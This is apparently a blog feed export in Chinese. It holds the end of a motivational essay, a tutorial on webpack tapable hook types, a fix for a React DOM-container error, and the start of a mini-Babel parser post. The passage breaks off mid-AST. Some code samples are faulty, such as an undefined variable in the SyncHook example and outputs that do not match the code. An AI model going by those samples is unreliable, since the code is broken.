</div><p>纸板上写着：“我知晓三个行业，会说三门语言，奋斗了三年，有三个孩子，失业三个月。但我只想要一份工作。”</p><p>他是谁的父亲，又是谁的丈夫呢？每次回家还有嗷嗷待哺的三个孩子，还有一个等着他赚钱的妻子，这样的场面真的不忍直视。</p><p><b>生活从未容易，如果你觉得容易，不过是有人在帮你承担不易。</b></p><p><b>11.</b></p><p>发生空袭后，弟弟不幸去世了。哥哥把他背在背上，带着他去火葬场，他的眼神是如此的坚定，即使眼泪快要流下来了，他也含泪坚强忍住。</p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/10024246-4926557698939691?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" style="min-height:200px;min-width:200px;" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p>这一生，和你相处的时间太短了。既然无法护你周全，那么你生命的最后一程，就由我来送你吧。</p><p>哪怕前面炮火纷飞，哪怕要失去我的生命，这是我作为一个哥哥的使命。</p><p><b>若有来生，愿我们都生活在和平年代，愿你还愿意做我的弟弟。</b></p><p><b>12.</b></p><p>很多时候，我觉得人生就像是图片中这只在暴风雪中的小鸟一样，虽遭遇漫天的飞雪和冰雹，但也只是弯弯身体，然后用头去直接迎接，从不退后半步！</p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/10024246-394000d3cfbedb04?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" style="min-height:200px;min-width:200px;" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p>卖糖葫芦的大叔说：<b>生活中的一个个挫折，就像是冰糖葫芦一样，竹竿刺进了身体，却成为了一生的脊梁。</b></p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/10024246-d8d7eb5ec32cef75?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" style="min-height:200px;min-width:200px;" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p>曾经听过一个故事：</p><p>一个男人梦见他和上帝走在沙滩上，他看到他的生命片段在天空中闪现，他转过身去，看到沙滩上有两行脚印，贯穿了他人生大部分时光，那是他和上帝的脚印。</p><p><b>可是他发现，在他一生中最糟糕的日子里，只有一行脚印。</b></p><p>男人对上帝说：你承诺过会和我同行的，为什么在我最需要你的时候抛弃了我？”</p><p>上帝回答他：<b>这里之所以只有一行脚印，是因为在那些最糟糕的日子里，是我背负着你前行。</b></p><div class="image-package">
<img class="uploaded-img" src="http://upload-images.jianshu.io/upload_images/10024246-fed657f626f15f65?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" style="min-height:200px;min-width:200px;" width="auto" height="auto"><br><div class="image-caption"></div>
</div><p>原来，真的有人一直在偷偷爱着我们，只是你不知道而已。</p><p>或许，我们每个人都小心翼翼地活着，或许我们每一次努力都已经竭尽全力，但是请相信，上天从未抛弃任何一个坚强的灵魂，也从不会辜负每一段最灰暗的苦难。</p><p><b>愿你有好运气，如果没有，愿你在不幸中学会慈悲；</b></p><p><b>愿你被很多人爱，如果没有，愿你在寂寞中学会宽容。</b></p><p><b>愿你被这个世界温柔以待，如果没有，请别忘了，我爱你。</b></p><p>作者：桌子，前南方航空公司职员，现教育培训行业先行者，兼职男模，签约专栏作家。微博@桌子的生活观 。</p>
        </div>
      </div>
    </div>
  </body>
</html>
]]></content>
  </entry>
  <entry>
    <title>Tapable Hook介绍</title>
    <url>/nirvana/webpack/webpack/TapableHook%E4%BB%8B%E7%BB%8D/</url>
    <content><![CDATA[<p><a href="https://user-images.githubusercontent.com/14739234/76166340-b6eb0400-6198-11ea-940e-c2b3e7482aa8.png"><img src="https://upload-images.jianshu.io/upload_images/10024246-15f98345db345d9b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></a> </p>
<p><code>tapable</code>是<code>webpack</code>重要的底层模块。理解<code>webpack</code>首先要理解<code>tapable</code>, 而<code>tapable hook</code>更是重中之重。</p>
<p><code>tapable</code>主要提供各式各样的<code>hook</code>。主要有下面几种类型:</p>
<ul>
<li>  SyncHook</li>
<li>  SyncBailHook</li>
<li>  SyncWaterfallHook</li>
<li>  SyncLoopHook</li>
<li>  AsyncParallelHook</li>
<li>  AsyncParallelBailHook</li>
<li>  AsyncSeriesHook</li>
<li>  AsyncSeriesBailHook</li>
<li>  AsyncSeriesWaterfallHook</li>
</ul>
<p>钩子的类型比较多，通过上面封面图分类看的会更加直观;</p>
<p>关键词介绍:</p>
<ul>
<li>  Sync/Async: 同步/异步;</li>
<li>  Bail: 可退出<code>Hook</code>, 当订阅事件有<code>return</code>返回值时，则不执行之后的订阅事件;</li>
<li>  Waterfall: 可以传递值。当前一个事件可以把值传给后一个事件;</li>
<li>  Loop: 循环执行事件。当事件有<code>return</code>返回值时会循环执行当前事件，直到没有<code>return</code>返回值时才退出执行下一个事件;</li>
<li>  AsyncParallel: 异步并行;</li>
<li>  AsyncSeries: 异步串行;</li>
</ul>
<p>常见的订阅/发布API</p>
<ul>
<li>  tap: 订阅一个同步事件;</li>
<li>  call: 发布一个同步事件;</li>
<li>  tapAsync: 订阅一个异步事件;</li>
<li>  callAsync: 发布一个异步事件;</li>
</ul>
<p>下面是每个Hook的流程图和介绍</p>
<h3 id="syncHook"><a href="#syncHook" class="headerlink" title="syncHook"></a>syncHook</h3><p><a href="http://123fe.cn/2020/07/21/tapable-hook%E4%BB%8B%E7%BB%8D/syncHook.png"><img src="https://upload-images.jianshu.io/upload_images/10024246-c6a65ede0cec32d7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></a> </p>
<p><code>syncHook</code>是最基础的同步<code>hook</code>, 按照订阅的前后顺序执行; 示例代码如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import &#123;SyncHook&#125;  from &quot;tapable&quot;;    </span><br><span class="line">var synchook &#x3D; new SyncHook([&quot;name&quot;]);</span><br><span class="line">synchook.tap(&quot;tap0&quot;, (name)&#x3D;&gt;&#123;</span><br><span class="line">    console.log(&quot;I&#39;m&quot;, a);</span><br><span class="line">&#125;);</span><br><span class="line">synchook.tap(&quot;tap1&quot;, (name)&#x3D;&gt;&#123;</span><br><span class="line">    console.log(&quot;I&#39;m&quot;, name);</span><br><span class="line">&#125;);</span><br><span class="line">synchook.tap(&quot;tap2&quot;, (name)&#x3D;&gt;&#123;</span><br><span class="line">    console.log(&quot;I&#39;m&quot;, name);</span><br><span class="line">&#125;);</span><br><span class="line">synchook.call(&quot;Ben&quot;);</span><br></pre></td></tr></table></figure>
<h3 id="syncBailHook"><a href="#syncBailHook" class="headerlink" title="syncBailHook"></a>syncBailHook</h3><p><a href="http://123fe.cn/2020/07/21/tapable-hook%E4%BB%8B%E7%BB%8D/syncBailHook.png"><img src="https://upload-images.jianshu.io/upload_images/10024246-531ffd3e1777e52b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="syncbailhook"></a> </p>
<p><code>syncBailHook</code>相比<code>syncHook</code>增加一个退出机制：当有一个订阅事件有<code>return</code>返回值，则之后的事件都不触发了;<br><code>syncBailHook</code>可用于一些需要前置条件判断的场景; 示例代码如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import &#123;SyncBailHook&#125;  from &quot;tapable&quot;;  </span><br><span class="line">var syncBailHook &#x3D; new SyncBailHook([&quot;name&quot;, &quot;height&quot;]);</span><br><span class="line">syncBailHook.tap(&quot;tap0&quot;, (name, height)&#x3D;&gt;&#123;        </span><br><span class="line">    console.log(&quot;I&#39;m&quot;, name);</span><br><span class="line">    if(name &#x3D;&#x3D; &quot;Ben&quot;)&#123;        </span><br><span class="line">        return false;</span><br><span class="line">    &#125;        </span><br><span class="line">&#125;);</span><br><span class="line">syncBailHook.tap(&quot;tap1&quot;, (name, height)&#x3D;&gt;&#123;</span><br><span class="line">    console.log(&quot;I&#39;m&quot;, name);</span><br><span class="line">&#125;);</span><br><span class="line">syncBailHook.tap(&quot;tap2&quot;, (name, height)&#x3D;&gt;&#123;</span><br><span class="line">    console.log(&quot;I&#39;m&quot;, name);</span><br><span class="line">&#125;);</span><br><span class="line">syncBailHook.call(&quot;Ben&quot;);</span><br></pre></td></tr></table></figure>

<p>上面代码当<code>tap0</code>事件有<code>return</code>时，<code>tap1, tap2</code>都不在触发了;</p>
<p><code>syncBailHook</code>执行流程图如下</p>
<h3 id="syncWaterfallHook"><a href="#syncWaterfallHook" class="headerlink" title="syncWaterfallHook"></a>syncWaterfallHook</h3><p><a href="http://123fe.cn/2020/07/21/tapable-hook%E4%BB%8B%E7%BB%8D/syncWaterfallHook.png"><img src="https://upload-images.jianshu.io/upload_images/10024246-1f0881514346a2a0.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></a><br><code>syncWaterfallHook</code>相比<code>syncHook</code>增加一个传递值的功能：前面一个事件可以将值传递给下一个事件;<br><code>syncWaterfallHook</code>可用于一些流程化的场景，第一步得到的结果传给第二步使用;</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import &#123;SyncWaterfallHook&#125;  from &quot;tapable&quot;;  </span><br><span class="line">var SyncWaterfallHook &#x3D; new SyncWaterfallHook([&quot;name&quot;]);</span><br><span class="line">SyncWaterfallHook.tap(&quot;tap0&quot;, (name, height)&#x3D;&gt;&#123;        </span><br><span class="line">    console.log(&quot;I&#39;m Tom&quot;);</span><br><span class="line">    return name + &quot;,Tom&quot;</span><br><span class="line">&#125;);</span><br><span class="line">SyncWaterfallHook.tap(&quot;tap1&quot;, (name, height)&#x3D;&gt;&#123;</span><br><span class="line">    console.log(&quot;I&#39;m Piter&quot;);</span><br><span class="line">    return name + &quot;,Piter&quot;</span><br><span class="line">&#125;);</span><br><span class="line">SyncWaterfallHook.tap(&quot;tap2&quot;, (name, height)&#x3D;&gt;&#123;</span><br><span class="line">    console.log(&quot;I&#39;m Luci&quot;);</span><br><span class="line">    return name + &quot;,Luci&quot;</span><br><span class="line">&#125;);</span><br><span class="line">SyncWaterfallHook.call(&quot;Ben&quot;);</span><br></pre></td></tr></table></figure>


<p>执行结果:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">Ben,Tom,Piter,Luci</span><br></pre></td></tr></table></figure>

<h3 id="syncLoopHook"><a href="#syncLoopHook" class="headerlink" title="syncLoopHook"></a>syncLoopHook</h3><p><a href="http://123fe.cn/2020/07/21/tapable-hook%E4%BB%8B%E7%BB%8D/syncLoopHook.png"><img src="https://upload-images.jianshu.io/upload_images/10024246-3a5ddf1e31bf4353.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></a> </p>
<p><code>syncLoopHook</code>相比<code>syncHook</code>增加一个循环机制：当订阅事件有<code>return</code>时会继续执行该事件，直到事件没有<code>return</code>再执行下一个事件;<br><code>syncLoopHook</code>可以用于需要递归的场景，比如遍历树节点之类;示例代码如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import &#123;SyncLoopHook&#125;  from &quot;tapable&quot;;  </span><br><span class="line">var syncLoopHook &#x3D; new SyncLoopHook();</span><br><span class="line">var num &#x3D; 0;</span><br><span class="line">syncLoopHook.tap(&quot;tap0&quot;, ()&#x3D;&gt;&#123;</span><br><span class="line">    console.log(&quot;tap0&quot;, num);</span><br><span class="line">    if(num++ &lt; 5)&#123;</span><br><span class="line">        return false;    </span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<p>执行结果如下:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">0</span><br><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td></tr></table></figure>
<p>当有注册多个事件时需要注意一点：之后事件会把之前事件也执行一次。执行流程图如下:<br><a href="http://123fe.cn/2020/07/21/tapable-hook%E4%BB%8B%E7%BB%8D/syncLoopHook2.png"><img src="https://upload-images.jianshu.io/upload_images/10024246-39f645feee728f4b.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></a> </p>
<h3 id="asyncParallelHook"><a href="#asyncParallelHook" class="headerlink" title="asyncParallelHook"></a>asyncParallelHook</h3><p><a href="http://123fe.cn/2020/07/21/tapable-hook%E4%BB%8B%E7%BB%8D/asyncParallelHook.png"><img src="https://upload-images.jianshu.io/upload_images/10024246-52d415a1f02dfe12.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></a> </p>
<p><code>asyncParallelHook</code>是同时触发所有异步注册事件，当所有注册事件都执行完毕后，整个发布事件才结束;<br><code>asyncParallelHook</code>应用的场景很多，比如请求多个接口合并数据;</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var asyncParallelHook &#x3D; new AsyncParallelHook([]);</span><br><span class="line">asyncParallelHook.tapAsync(&quot;tap0&quot;, (cb)&#x3D;&gt;&#123;</span><br><span class="line">    console.log(&quot;tap0&quot;);</span><br><span class="line">    setTimeout(()&#x3D;&gt;&#123;</span><br><span class="line">        cb();</span><br><span class="line">    &#125;, 2000);</span><br><span class="line">&#125;);</span><br><span class="line">asyncParallelHook.tapAsync(&quot;tap1&quot;, (cb)&#x3D;&gt;&#123;</span><br><span class="line">    console.log(&quot;tap1&quot;);</span><br><span class="line">    setTimeout(()&#x3D;&gt;&#123;</span><br><span class="line">        cb();</span><br><span class="line">    &#125;, 4000);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">asyncParallelHook.tapAsync(&quot;tap2&quot;, (cb)&#x3D;&gt;&#123;</span><br><span class="line">    console.log(&quot;tap2&quot;);</span><br><span class="line">    setTimeout(()&#x3D;&gt;&#123;</span><br><span class="line">        cb();</span><br><span class="line">    &#125;, 4000);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">&#x2F;&#x2F; console.log(asyncParallelHook);</span><br><span class="line">asyncParallelHook.callAsync(()&#x3D;&gt;&#123;</span><br><span class="line">    console.log(&quot;end&quot;);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<p>执行结果</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#x2F;&#x2F; 2s后</span><br><span class="line">tap0 </span><br><span class="line">&#x2F;&#x2F; 4s后</span><br><span class="line">tap1</span><br><span class="line">tap2</span><br></pre></td></tr></table></figure>

<h3 id="asyncParallelBailHook"><a href="#asyncParallelBailHook" class="headerlink" title="asyncParallelBailHook"></a>asyncParallelBailHook</h3><p><a href="http://123fe.cn/2020/07/21/tapable-hook%E4%BB%8B%E7%BB%8D/asyncParallelBailHook.png"><img src="https://upload-images.jianshu.io/upload_images/10024246-97bbeb4ce95665a6.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></a><br><code>asyncParallelBailHook</code>相比<code>asyncParallelHook</code>多了一个退出机制，和<code>syncBailHook</code>是一样的逻辑;</p>
<p><code>asyncParallelBailHook</code>可以应用在一些需要前置判断的场景，如果前置条件不成立，则退出整个流程;</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var asyncParallelBailHook &#x3D; new AsyncParallelBailHook();</span><br><span class="line"></span><br><span class="line">asyncParallelBailHook.tapAsync(&quot;tapAsync0&quot;, (cb)&#x3D;&gt;&#123;    </span><br><span class="line">  cb();</span><br><span class="line">  return false;</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">asyncParallelBailHook.tapAsync(&quot;tapAsync1&quot;, (cb)&#x3D;&gt;&#123;  </span><br><span class="line">  cb();</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">asyncParallelBailHook.callAsync(()&#x3D;&gt;&#123;</span><br><span class="line">    console.log(&quot;end&quot;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">asyncParallelBailHook.call();</span><br></pre></td></tr></table></figure>

<h3 id="asyncSeriesHook"><a href="#asyncSeriesHook" class="headerlink" title="asyncSeriesHook"></a>asyncSeriesHook</h3><p><a href="http://123fe.cn/2020/07/21/tapable-hook%E4%BB%8B%E7%BB%8D/asyncSeriesHook.png"><img src="https://upload-images.jianshu.io/upload_images/10024246-8bda39ec3879af3e.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></a><br><code>asyncSeriesHook</code>是按照注册的前后顺序触发异步事件，一个异步事件执行完毕后才能触发下一个。</p>
<p><code>asyncSeriesHook</code>可以应用场景很多,相比<code>syncHook</code>同步事件，<code>asyncSeriesHook</code>可以执行一些异步事件;</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var asyncSeriesHook &#x3D; new AsyncSeriesHook();</span><br><span class="line"></span><br><span class="line">asyncSeriesHook.tapAsync(&quot;tapAsync0&quot;, (cb)&#x3D;&gt;&#123;    </span><br><span class="line">    setTimeout(()&#x3D;&gt;&#123;</span><br><span class="line">        cb &amp;&amp; cb()</span><br><span class="line">    &#125;, 5000);</span><br><span class="line">&#125;); </span><br><span class="line"></span><br><span class="line">asyncSeriesHook.tapAsync(&quot;tapAsync1&quot;, (cb)&#x3D;&gt;&#123;    </span><br><span class="line">    setTimeout(()&#x3D;&gt;&#123;</span><br><span class="line">        cb &amp;&amp; cb()</span><br><span class="line">    &#125;, 1000);    </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">asyncSeriesHook.callAsync(()&#x3D;&gt;&#123;</span><br><span class="line">    console.log(&quot;end&quot;);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<h3 id="asyncSeriesBailHook"><a href="#asyncSeriesBailHook" class="headerlink" title="asyncSeriesBailHook"></a>asyncSeriesBailHook</h3><p><a href="http://123fe.cn/2020/07/21/tapable-hook%E4%BB%8B%E7%BB%8D/asyncSeriesBailHook.png"><img src="https://upload-images.jianshu.io/upload_images/10024246-1d1503cf621d7e88.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></a><br><code>asyncSeriesBailHook</code>相比<code>asyncSeriesHook</code>多了一个退出机制，和<code>syncBailHook</code>是一样的逻辑;<br><code>asyncSeriesBailHook</code>可以应用在一些需要异步判断前置条件的场景，如果前置条件不成立则退出整个流程;</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var asyncSeriesBailHook &#x3D; new AsyncSeriesBailHook([&quot;sum&quot;]);</span><br><span class="line"></span><br><span class="line">asyncSeriesBailHook.tapAsync(&quot;tapAsync0&quot;, (sum, cb)&#x3D;&gt;&#123;</span><br><span class="line">    console.log(&quot;sum&quot;, sum);</span><br><span class="line">    setTimeout(()&#x3D;&gt;&#123;</span><br><span class="line">        &#x2F;&#x2F; cb &amp;&amp; cb(false); </span><br><span class="line">        return;</span><br><span class="line">    &#125;, 2000);</span><br><span class="line">&#125;); </span><br><span class="line"></span><br><span class="line">asyncSeriesBailHook.tapAsync(&quot;tapAsync1&quot;, (sum, cb)&#x3D;&gt;&#123;</span><br><span class="line">    console.log(&quot;sum&quot;, sum);     </span><br><span class="line">    setTimeout(()&#x3D;&gt;&#123;</span><br><span class="line">        cb &amp;&amp; cb(false);</span><br><span class="line">    &#125;, 1000);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">asyncSeriesBailHook.callAsync(1, (sum)&#x3D;&gt;&#123;</span><br><span class="line">    console.log(&quot;end&quot;, &quot;sum&quot;, sum);</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>

<h3 id="asyncSeriesWaterfallHook"><a href="#asyncSeriesWaterfallHook" class="headerlink" title="asyncSeriesWaterfallHook"></a>asyncSeriesWaterfallHook</h3><p><a href="http://123fe.cn/2020/07/21/tapable-hook%E4%BB%8B%E7%BB%8D/asyncSeriesWaterfallHook.png"><img src="https://upload-images.jianshu.io/upload_images/10024246-6095da07b9f77ea3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240"></a><br><code>asyncSeriesWaterfallHook</code>相比<code>asyncSeriesHook</code>多了一个传值功能，和<code>syncWaterfallHook</code>是一样的逻辑;</p>
<p><code>asyncSeriesWaterfallHook</code>可以应用在异步流程化的场景，比如将一个异步请求接口值传给下一个;</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var asyncSeriesWaterfallHook &#x3D; new AsyncSeriesWaterfallHook([&quot;sum&quot;]);</span><br><span class="line"></span><br><span class="line">asyncSeriesWaterfallHook.tapAsync(&quot;tapAsync0&quot;, (sum, cb)&#x3D;&gt;&#123;    </span><br><span class="line">    console.log(&quot;sum&quot;, sum);</span><br><span class="line">    setTimeout(()&#x3D;&gt;&#123;</span><br><span class="line">        cb &amp;&amp; cb(null, ++sum);        </span><br><span class="line">    &#125;, 2000);</span><br><span class="line">&#125;); </span><br><span class="line"></span><br><span class="line">asyncSeriesWaterfallHook.tapAsync(&quot;tapAsync1&quot;, (sum, cb)&#x3D;&gt;&#123;    </span><br><span class="line">    console.log(&quot;sum&quot;, sum);</span><br><span class="line">    setTimeout(()&#x3D;&gt;&#123;</span><br><span class="line">        cb &amp;&amp; cb(null, ++sum);        </span><br><span class="line">    &#125;, 1000);    </span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">asyncSeriesWaterfallHook.callAsync(1, (sum)&#x3D;&gt;&#123;</span><br><span class="line">    console.log(&quot;end&quot;,  sum);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>到这里已经介绍完9个<code>hook</code>，通过这9个<code>hook</code>可以覆盖各种各样的业务场景。<br>最后我想简单说一下<code>hook</code>这种设计模式的优缺点。我认为有封装和扩展两个优点。通过<code>hook</code>设计可以将相同功能代码放在一起实现代码拆分和封装。通过增加<code>hook</code>方式很容易实现功能的扩展。我认为有一个缺点：需要遵循一定调用规范，需要事先了解Hook相关API和返回值等。<br><code>hook</code>设计模式整体来说还是利大于弊，底层采用分治的设计思想。<code>hook</code>特别适合功能复杂和功能经常需要扩展的场景下使用。</p>
<blockquote>
<p>原文：<a href="http://123fe.cn/2020/07/21/tapable-hook%E4%BB%8B%E7%BB%8D/">http://123fe.cn/2020/07/21/tapable-hook%E4%BB%8B%E7%BB%8D/</a>   </p>
</blockquote>
]]></content>
      <categories>
        <category>webpack</category>
      </categories>
  </entry>
  <entry>
    <title>[React Error]: Target container is not a DOM element</title>
    <url>/nirvana/webpack/webpack/%5BReact-Error%5D:Target-container-is-not-a-DOM-element/</url>
    <content><![CDATA[<p>webpack在后端对React组件进行渲染的时候，浏览器控制台报错：</p>
<p><code>compose.js:822 Uncaught Invariant Violation: _registerComponent(...): Target container is not a DOM element.</code></p>
<p>我很奇怪，webpack可以正常将我的React组件使用babel转换，我的组件代码如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">import React from &#39;react&#39;</span><br><span class="line">import ReactDOM from &#39;react-dom&#39;</span><br><span class="line">import &#39;.&#x2F;compose.less&#39;</span><br><span class="line"></span><br><span class="line">class App extends React.Component &#123;</span><br><span class="line">  render() &#123;</span><br><span class="line">    return (</span><br><span class="line">      &lt;p className&#x3D;&quot;compose-font&quot;&gt;</span><br><span class="line">        Little Bitch</span><br><span class="line">      &lt;&#x2F;p&gt;</span><br><span class="line">    )</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">ReactDOM.render(&lt;App &#x2F;&gt;, document.getElementById(&#39;app&#39;));</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">var config &#x3D; &#123;</span><br><span class="line">    entry: &#39;.&#x2F;main.js&#39;,</span><br><span class="line">     </span><br><span class="line">    output: &#123;</span><br><span class="line">       path:__dirname,</span><br><span class="line">       filename: &#39;index.js&#39;,</span><br><span class="line">    &#125;,</span><br><span class="line">    </span><br><span class="line">    mode: &quot;development&quot;, </span><br><span class="line"></span><br><span class="line">    devServer: &#123;</span><br><span class="line">       inline: true,</span><br><span class="line">       port: 4444</span><br><span class="line">    &#125;,</span><br><span class="line">    resolve: &#123;</span><br><span class="line">        extensions: [ &#39;.js&#39;, &#39;.jsx&#39;, &#39;.css&#39;, &#39;.json&#39;], &#x2F;&#x2F; 配置默认扩展名</span><br><span class="line">        modules: [&#39;node_modules&#39;]</span><br><span class="line">    &#125;,</span><br><span class="line">    module: &#123;</span><br><span class="line">        rules: [ &#123;</span><br><span class="line">          test: &#x2F;\.js|jsx?$&#x2F;,</span><br><span class="line">          exclude: [&#x2F;node_modules&#x2F;],</span><br><span class="line">            loaders: &#39;babel-loader&#39;,</span><br><span class="line">            options: &#123;</span><br><span class="line">                presets: [&quot;@babel&#x2F;env&quot;]</span><br><span class="line">            &#125;</span><br><span class="line">       &#125;]</span><br><span class="line">       </span><br><span class="line">    &#125;</span><br><span class="line">     </span><br><span class="line"> &#125;</span><br><span class="line"> </span><br><span class="line"> module.exports &#x3D; config;</span><br></pre></td></tr></table></figure>
<p>html页面</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line">  &lt;head&gt;</span><br><span class="line">    &lt;meta charset&#x3D;&quot;UTF-8&quot; &#x2F;&gt;</span><br><span class="line">  &lt;&#x2F;head&gt;</span><br><span class="line">    &lt;script src&#x3D;&quot;.&#x2F;index.js&quot;&gt;&lt;&#x2F;script&gt;</span><br><span class="line">  &lt;body&gt;</span><br><span class="line">    &lt;div id&#x3D;&quot;app&quot;&gt;&lt;&#x2F;div&gt;</span><br><span class="line">  &lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;html&gt;</span><br></pre></td></tr></table></figure>
<p>出现此错误的原因是我将webpack生成的js文件放在了head，此时DOM还没有建立完毕，因此出现<code>not a DOM element</code>的错误，所以将js文件放在HTML底部就可以了。<br>另外一个可能出错的点是<code>document.getElementById(&#39;app&#39;)</code>中的id不对应，造成无法在页面中找到对应的节点</p>
]]></content>
      <categories>
        <category>webpack</category>
      </categories>
  </entry>
  <entry>
    <title>webpack插件babel，我们如何手写一个babel，以及babel的原理</title>
    <url>/nirvana/webpack/webpack/%E6%88%91%E4%BB%AC%E5%A6%82%E4%BD%95%E6%89%8B%E5%86%99%E4%B8%80%E4%B8%AAbabel/</url>
    <content><![CDATA[<h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>Babel 是现代 JavaScript 语法转换器,几乎在任何现代前端项目中都能看到他的身影,其背后的原理对于大部分开发者还属于黑盒,不过 Babel 作为一个工具真的有了解背后原理的必要吗?</p>
<p>如果只是 Babel 可能真没有必要,问题是其背后的原理在我们开发中应用过于广泛了,包括不限于: eslint jshint stylelint css-in-js prettier jsx vue-template uglify-js postcss less 等等等等,从模板到代码检测,从混淆压缩到代码转换,甚至编辑器的代码高亮都与之息息相关.</p>
<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Babel 大概分为三大部分:</p>
<ul>
<li>  解析: 将代码(其实就是字符串)转换成 AST( 抽象语法树)</li>
<li>  转换: 访问 AST 的节点进行变换操作生成新的 AST</li>
<li>  生成: 以新的 AST 为基础生成代码</li>
</ul>
<p>我们主要通过打造一个微型 babel 来了解 babel 的基本原理,这个微型 babel 的功能很单一也很鸡肋,但是依然有400行代码,其实现细节与 babel 并不相同,因为我们省去了很多额外的验证和信息解析,因为单单一个兼容现代 JavaScript 语法的 parser 就需要5000行代码,并不利于我们快速了解 babel 的基本实现,所以这个微型 babel可以说比较鸡肋(因为除了展示之外没啥用处),但是比较完整展示了 babel 的基本原理,你可以以此作为入门,</p>
<h2 id="代码解析"><a href="#代码解析" class="headerlink" title="代码解析"></a>代码解析</h2><h3 id="parser-概念"><a href="#parser-概念" class="headerlink" title="parser 概念"></a>parser 概念</h3><p>代码解析,也就是我们常说的 Parser, 用于将一段代码(文本)解析成一个数据结构.</p>
<p>例如这段 es6的代码</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">const add &#x3D; (a, b) &#x3D;&gt; a + b </span><br></pre></td></tr></table></figure>

<p>我们用 babel 解析后便是这种形式:</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  &quot;type&quot;: &quot;File&quot;,</span><br><span class="line">  &quot;start&quot;: 0,</span><br><span class="line">  &quot;end&quot;: 27,</span><br><span class="line">  &quot;loc&quot;: &#123;</span><br><span class="line">    &quot;start&quot;: &#123;</span><br><span class="line">      &quot;line&quot;: 1,</span><br><span class="line">      &quot;column&quot;: 0</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;end&quot;: &#123;</span><br><span class="line">      &quot;line&quot;: 1,</span><br><span class="line">      &quot;column&quot;: 27</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;,</span><br><span class="line">  &quot;program&quot;: &#123;</span><br><span class="line">    &quot;type&quot;: &quot;Program&quot;,</span><br><span class="line">    &quot;start&quot;: 0,</span><br><span class="line">    &quot;end&quot;: 27,</span><br><span class="line">    &quot;loc&quot;: &#123;</span><br><span class="line">      &quot;start&quot;: &#123;</span><br><span class="line">        &quot;line&quot;: 1,</span><br><span class="line">        &quot;column&quot;: 0</span><br><span class="line">      &#125;,</span><br><span class="line">      &quot;end&quot;: &#123;</span><br><span class="line">        &quot;line&quot;: 1,</span><br><span class="line">        &quot;column&quot;: 27</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;,</span><br><span class="line">    &quot;sourceType&quot;: &quot;module&quot;,</span><br><span class="line">    &quot;body&quot;: [</span><br><span class="line">      &#123;</span><br><span class="line">        &quot;type&quot;: &quot;VariableDeclaration&quot;,</span><br><span class="line">        &quot;start&quot;: 0,</span><br><span class="line">        &quot;end&quot;: 27,</span><br><span class="line">        &quot;loc&quot;: &#123;</span><br><span class="line">          &quot;start&quot;: &#123;</span><br><span class="line">            &quot;line&quot;: 1,</span><br><span class="line">            &quot;column&quot;: 0</span><br><span class="line">          &#125;,</span><br><span class="line">          &quot;end&quot;: &#123;</span><br><span class="line">            